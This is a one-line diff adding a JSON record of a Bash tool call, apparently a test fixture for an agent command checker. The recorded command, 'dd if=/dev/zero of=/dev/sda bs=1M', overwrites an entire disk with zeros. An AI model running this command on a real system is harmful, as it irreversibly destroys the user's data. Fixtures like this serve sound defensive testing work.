@@ -1,0 +1,1 @@
+{"tool_name":"Bash","args":{"command":"dd if=/dev/zero of=/dev/sda bs=1M"}}
